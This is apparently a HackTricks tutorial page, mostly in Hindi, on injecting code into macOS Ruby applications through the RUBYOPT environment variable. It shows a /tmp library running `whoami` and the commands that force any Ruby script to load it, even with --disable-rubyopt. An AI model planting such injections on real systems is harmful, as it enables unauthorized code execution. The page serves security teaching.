# macOS Ruby Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## RUBYOPT

इस env वेरिएबल का उपयोग करके **ruby** को निष्पादित करते समय **नए params** को **जोड़ना** संभव है। हालांकि **`-e`** पैरामीटर का उपयोग ruby को निष्पादित करने के लिए कोड निर्दिष्ट करने के लिए नहीं किया जा सकता है, लेकिन **`-I`** और **`-r`** पैरामीटर का उपयोग करके लोड पथ में एक नई फ़ोल्डर जोड़ना और फिर **लोड करने के लिए एक लाइब्रेरी निर्दिष्ट करना** संभव है।

लाइब्रेरी **`inject.rb`** को **`/tmp`** में बनाएं:

{% code title="inject.rb" %}
```ruby
puts `whoami`
```
{% endcode %}

किसी भी जगह एक रूबी स्क्रिप्ट बनाएं जैसे:

{% code title="hello.rb" %}
```ruby
puts 'Hello, World!'
```
{% endcode %}

फिर एक मनमाना रूबी स्क्रिप्ट इसे लोड करें:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
दिलचस्प तथ्य, यह **`--disable-rubyopt`** पैरामीटर के साथ भी काम करता है:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{% hint style="success" %}
सीखें और AWS हैकिंग का अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
सीखें और GCP हैकिंग का अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।

</details>
{% endhint %}
